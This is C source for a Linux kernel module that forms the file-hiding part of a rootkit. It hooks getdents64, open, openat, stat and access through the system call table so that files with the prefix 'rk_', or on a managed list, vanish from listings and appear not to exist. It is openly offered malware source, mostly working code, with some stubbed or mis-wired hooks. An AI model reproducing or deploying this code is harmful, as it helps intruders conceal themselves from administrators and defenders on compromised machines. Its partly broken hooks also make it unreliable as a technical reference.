/*
 * Advanced File Hiding Implementation
 * Provides multiple methods to hide files and directories
 * Kernel Version: 5.15.142
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/list.h>
#include <linux/mutex.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/namei.h>
#include <linux/dcache.h>

#define MAX_HIDDEN_FILES 1000
#define MAX_FILENAME_LEN 256
#define HIDE_PREFIX "rk_"

// 隐藏文件结构
struct hidden_file {
    char *name;                 // 文件名或路径
    char *full_path;           // 完整路径
    int hide_type;             // 隐藏类型
    struct list_head list;     // 链表节点
};

// 隐藏类型枚举
enum hide_type {
    HIDE_EXACT_MATCH,    // 精确匹配
    HIDE_PARTIAL_MATCH,  // 部分匹配
    HIDE_PREFIX_MATCH,   // 前缀匹配
    HIDE_SUFFIX_MATCH,   // 后缀匹配
    HIDE_REGEX_MATCH     // 正则表达式匹配（简化版）
};

// 全局变量
static LIST_HEAD(hidden_files_list);
static DEFINE_MUTEX(hidden_files_mutex);
static int hidden_files_count = 0;

// 原始系统调用指针
static asmlinkage long (*original_getdents64)(const struct pt_regs *);
static asmlinkage long (*original_getdents)(const struct pt_regs *);
static asmlinkage long (*original_open)(const struct pt_regs *);
static asmlinkage long (*original_openat)(const struct pt_regs *);
static asmlinkage long (*original_stat)(const struct pt_regs *);
static asmlinkage long (*original_lstat)(const struct pt_regs *);
static asmlinkage long (*original_access)(const struct pt_regs *);

// 外部变量
extern unsigned long *sys_call_table;
extern void disable_write_protection(void);
extern void enable_write_protection(void);

// 函数声明
static int is_hidden_file(const char *name, const char *full_path);
static int add_hidden_file(const char *name, const char *full_path, enum hide_type type);
static int remove_hidden_file(const char *name);
static void clear_hidden_files(void);
static int match_pattern(const char *name, const char *pattern, enum hide_type type);
static char *get_full_path_from_fd(int fd, char *buffer, size_t size);

// 模式匹配函数
static int match_pattern(const char *name, const char *pattern, enum hide_type type) {
    if (!name || !pattern) {
        return 0;
    }
    
    switch (type) {
        case HIDE_EXACT_MATCH:
            return strcmp(name, pattern) == 0;
            
        case HIDE_PARTIAL_MATCH:
            return strstr(name, pattern) != NULL;
            
        case HIDE_PREFIX_MATCH:
            return strncmp(name, pattern, strlen(pattern)) == 0;
            
        case HIDE_SUFFIX_MATCH: {
            int name_len = strlen(name);
            int pattern_len = strlen(pattern);
            if (name_len < pattern_len) {
                return 0;
            }
            return strcmp(name + name_len - pattern_len, pattern) == 0;
        }
        
        case HIDE_REGEX_MATCH:
            // 简化的正则表达式匹配（只支持*通配符）
            return strstr(name, pattern) != NULL; // 简化实现
            
        default:
            return 0;
    }
}

// 检查文件是否应该被隐藏
static int is_hidden_file(const char *name, const char *full_path) {
    struct hidden_file *hf;
    int result = 0;
    
    if (!name) {
        return 0;
    }
    
    // 检查默认隐藏前缀
    if (strncmp(name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0) {
        return 1;
    }
    
    // 检查隐藏列表
    mutex_lock(&hidden_files_mutex);
    
    list_for_each_entry(hf, &hidden_files_list, list) {
        // 检查文件名匹配
        if (match_pattern(name, hf->name, hf->hide_type)) {
            result = 1;
            break;
        }
        
        // 检查完整路径匹配（如果提供了路径）
        if (full_path && hf->full_path && 
            match_pattern(full_path, hf->full_path, hf->hide_type)) {
            result = 1;
            break;
        }
    }
    
    mutex_unlock(&hidden_files_mutex);
    return result;
}

// 添加隐藏文件
static int add_hidden_file(const char *name, const char *full_path, enum hide_type type) {
    struct hidden_file *hf;
    
    if (!name || hidden_files_count >= MAX_HIDDEN_FILES) {
        return -EINVAL;
    }
    
    hf = kmalloc(sizeof(struct hidden_file), GFP_KERNEL);
    if (!hf) {
        return -ENOMEM;
    }
    
    hf->name = kstrdup(name, GFP_KERNEL);
    if (!hf->name) {
        kfree(hf);
        return -ENOMEM;
    }
    
    if (full_path) {
        hf->full_path = kstrdup(full_path, GFP_KERNEL);
        if (!hf->full_path) {
            kfree(hf->name);
            kfree(hf);
            return -ENOMEM;
        }
    } else {
        hf->full_path = NULL;
    }
    
    hf->hide_type = type;
    
    mutex_lock(&hidden_files_mutex);
    list_add_tail(&hf->list, &hidden_files_list);
    hidden_files_count++;
    mutex_unlock(&hidden_files_mutex);
    
    printk(KERN_INFO "[rootkit] File hidden: %s (type: %d)\n", name, type);
    return 0;
}

// 移除隐藏文件
static int remove_hidden_file(const char *name) {
    struct hidden_file *hf, *tmp;
    int removed = 0;
    
    if (!name) {
        return -EINVAL;
    }
    
    mutex_lock(&hidden_files_mutex);
    
    list_for_each_entry_safe(hf, tmp, &hidden_files_list, list) {
        if (strcmp(hf->name, name) == 0) {
            list_del(&hf->list);
            kfree(hf->name);
            kfree(hf->full_path);
            kfree(hf);
            hidden_files_count--;
            removed = 1;
            break;
        }
    }
    
    mutex_unlock(&hidden_files_mutex);
    
    if (removed) {
        printk(KERN_INFO "[rootkit] File unhidden: %s\n", name);
    }
    
    return removed ? 0 : -ENOENT;
}

// 清空隐藏文件列表
static void clear_hidden_files(void) {
    struct hidden_file *hf, *tmp;
    
    mutex_lock(&hidden_files_mutex);
    
    list_for_each_entry_safe(hf, tmp, &hidden_files_list, list) {
        list_del(&hf->list);
        kfree(hf->name);
        kfree(hf->full_path);
        kfree(hf);
    }
    
    hidden_files_count = 0;
    mutex_unlock(&hidden_files_mutex);
    
    printk(KERN_INFO "[rootkit] All hidden files cleared\n");
}

// 从文件描述符获取完整路径
static char *get_full_path_from_fd(int fd, char *buffer, size_t size) {
    struct file *file;
    char *path = NULL;
    
    file = fget(fd);
    if (file) {
        path = d_path(&file->f_path, buffer, size);
        fput(file);
    }
    
    return IS_ERR(path) ? NULL : path;
}

// Hook getdents64 系统调用
static asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;
    int ret;
    char *full_path = NULL;
    char path_buffer[PATH_MAX];
    
    ret = original_getdents64(regs);
    if (ret <= 0) {
        return ret;
    }
    
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if (!dirent_ker) {
        return ret;
    }
    
    if (copy_from_user(dirent_ker, dirent, ret)) {
        kfree(dirent_ker);
        return ret;
    }
    
    // 尝试获取目录的完整路径
    full_path = get_full_path_from_fd((int)regs->di, path_buffer, sizeof(path_buffer));
    
    while (offset < ret) {
        current_dir = (void *)dirent_ker + offset;
        
        // 构建完整文件路径
        char full_file_path[PATH_MAX];
        if (full_path) {
            snprintf(full_file_path, sizeof(full_file_path), "%s/%s", 
                    full_path, current_dir->d_name);
        } else {
            strncpy(full_file_path, current_dir->d_name, sizeof(full_file_path) - 1);
            full_file_path[sizeof(full_file_path) - 1] = '\0';
        }
        
        // 检查是否需要隐藏
        if (is_hidden_file(current_dir->d_name, full_file_path)) {
            if (current_dir == dirent_ker) {
                // 如果是第一个条目，移动后续内容
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            } else {
                // 调整前一个条目的记录长度
                previous_dir->d_reclen += current_dir->d_reclen;
            }
        } else {
            previous_dir = current_dir;
        }
        
        offset += current_dir->d_reclen;
    }
    
    if (copy_to_user(dirent, dirent_ker, ret)) {
        kfree(dirent_ker);
        return ret;
    }
    
    kfree(dirent_ker);
    return ret;
}

// Hook getdents 系统调用（32位兼容）
static asmlinkage long hooked_getdents(const struct pt_regs *regs) {
    // 类似getdents64的实现，但使用linux_dirent结构
    return original_getdents(regs);
}

// Hook open 系统调用
static asmlinkage long hooked_open(const struct pt_regs *regs) {
    char __user *filename = (char __user *)regs->di;
    char *kernel_filename;
    
    kernel_filename = strndup_user(filename, PATH_MAX);
    if (IS_ERR(kernel_filename)) {
        return original_open(regs);
    }
    
    // 检查是否为隐藏文件
    if (is_hidden_file(kernel_filename, kernel_filename)) {
        kfree(kernel_filename);
        return -ENOENT; // 文件不存在
    }
    
    kfree(kernel_filename);
    return original_open(regs);
}

// Hook openat 系统调用
static asmlinkage long hooked_openat(const struct pt_regs *regs) {
    char __user *filename = (char __user *)regs->si;
    char *kernel_filename;
    
    kernel_filename = strndup_user(filename, PATH_MAX);
    if (IS_ERR(kernel_filename)) {
        return original_openat(regs);
    }
    
    // 检查是否为隐藏文件
    if (is_hidden_file(kernel_filename, kernel_filename)) {
        kfree(kernel_filename);
        return -ENOENT; // 文件不存在
    }
    
    kfree(kernel_filename);
    return original_openat(regs);
}

// Hook stat 系统调用
static asmlinkage long hooked_stat(const struct pt_regs *regs) {
    char __user *filename = (char __user *)regs->di;
    char *kernel_filename;
    
    kernel_filename = strndup_user(filename, PATH_MAX);
    if (IS_ERR(kernel_filename)) {
        return original_stat(regs);
    }
    
    // 检查是否为隐藏文件
    if (is_hidden_file(kernel_filename, kernel_filename)) {
        kfree(kernel_filename);
        return -ENOENT; // 文件不存在
    }
    
    kfree(kernel_filename);
    return original_stat(regs);
}

// Hook access 系统调用
static asmlinkage long hooked_access(const struct pt_regs *regs) {
    char __user *filename = (char __user *)regs->di;
    char *kernel_filename;
    
    kernel_filename = strndup_user(filename, PATH_MAX);
    if (IS_ERR(kernel_filename)) {
        return original_access(regs);
    }
    
    // 检查是否为隐藏文件
    if (is_hidden_file(kernel_filename, kernel_filename)) {
        kfree(kernel_filename);
        return -ENOENT; // 文件不存在
    }
    
    kfree(kernel_filename);
    return original_access(regs);
}

// 公共接口函数
int hide_file(const char *name, enum hide_type type) {
    return add_hidden_file(name, NULL, type);
}

int hide_file_with_path(const char *name, const char *full_path, enum hide_type type) {
    return add_hidden_file(name, full_path, type);
}

int unhide_file(const char *name) {
    return remove_hidden_file(name);
}

int get_hidden_files_count(void) {
    return hidden_files_count;
}

void get_hidden_files_info(char *buffer, size_t size) {
    struct hidden_file *hf;
    int offset = 0;
    const char *type_names[] = {
        "EXACT", "PARTIAL", "PREFIX", "SUFFIX", "REGEX"
    };
    
    offset += snprintf(buffer + offset, size - offset, 
                      "Hidden Files (%d/%d):\n", 
                      hidden_files_count, MAX_HIDDEN_FILES);
    
    mutex_lock(&hidden_files_mutex);
    
    list_for_each_entry(hf, &hidden_files_list, list) {
        if (offset >= size - 100) break; // 防止缓冲区溢出
        
        offset += snprintf(buffer + offset, size - offset,
                          "  %s [%s]%s%s\n",
                          hf->name,
                          type_names[hf->hide_type],
                          hf->full_path ? " -> " : "",
                          hf->full_path ? hf->full_path : "");
    }
    
    mutex_unlock(&hidden_files_mutex);
}

// 初始化文件隐藏子系统
int init_file_hiding(void) {
    if (!sys_call_table) {
        printk(KERN_ERR "[rootkit] System call table not available\n");
        return -1;
    }
    
    // 保存原始系统调用
    original_getdents64 = (void *)sys_call_table[__NR_getdents64];
    original_getdents = (void *)sys_call_table[__NR_getdents];
    original_open = (void *)sys_call_table[__NR_open];
    original_openat = (void *)sys_call_table[__NR_openat];
    original_stat = (void *)sys_call_table[__NR_newfstat];
    original_access = (void *)sys_call_table[__NR_access];
    
    // Hook系统调用
    disable_write_protection();
    sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    sys_call_table[__NR_getdents] = (unsigned long)hooked_getdents;
    sys_call_table[__NR_open] = (unsigned long)hooked_open;
    sys_call_table[__NR_openat] = (unsigned long)hooked_openat;
    sys_call_table[__NR_newfstat] = (unsigned long)hooked_stat;
    sys_call_table[__NR_access] = (unsigned long)hooked_access;
    enable_write_protection();
    
    printk(KERN_INFO "[rootkit] File hiding subsystem initialized\n");
    printk(KERN_INFO "[rootkit] Default hide prefix: %s\n", HIDE_PREFIX);
    
    return 0;
}

// 清理文件隐藏子系统
void cleanup_file_hiding(void) {
    // 恢复原始系统调用
    if (sys_call_table) {
        disable_write_protection();
        if (original_getdents64)
            sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
        if (original_getdents)
            sys_call_table[__NR_getdents] = (unsigned long)original_getdents;
        if (original_open)
            sys_call_table[__NR_open] = (unsigned long)original_open;
        if (original_openat)
            sys_call_table[__NR_openat] = (unsigned long)original_openat;
        if (original_stat)
            sys_call_table[__NR_newfstat] = (unsigned long)original_stat;
        if (original_access)
            sys_call_table[__NR_access] = (unsigned long)original_access;
        enable_write_protection();
    }
    
    // 清理隐藏文件列表
    clear_hidden_files();
    
    printk(KERN_INFO "[rootkit] File hiding subsystem cleaned up\n");
}

// 导出符号
EXPORT_SYMBOL(hide_file);
EXPORT_SYMBOL(hide_file_with_path);
EXPORT_SYMBOL(unhide_file);
EXPORT_SYMBOL(get_hidden_files_count);
EXPORT_SYMBOL(get_hidden_files_info);
EXPORT_SYMBOL(init_file_hiding);
EXPORT_SYMBOL(cleanup_file_hiding);